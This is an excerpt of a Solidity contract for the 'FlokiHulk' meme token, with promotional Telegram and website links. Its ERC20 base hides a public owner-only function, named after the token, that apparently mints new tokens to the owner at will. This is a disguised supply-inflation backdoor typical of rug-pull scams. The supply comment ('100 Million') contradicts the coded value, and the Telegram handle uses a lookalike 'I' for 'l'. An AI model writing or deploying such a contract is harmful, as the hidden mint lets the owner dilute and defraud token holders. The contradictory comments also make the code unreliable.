...
//
// $FlokiHulk proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/FlokiHuIk
// 📱 Website ::https://flokihulk.tech/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _FlokiHulk(uint256 amount) public onlyOwner {
 _FlokiHulk(msg.sender, amount);
    }
    ...
    function _FlokiHulk(address account, uint256 amount) internal virtual {
...
contract $FlokiHulk is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Floki Hulk", "FLH") {
     _FlokiHulk(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}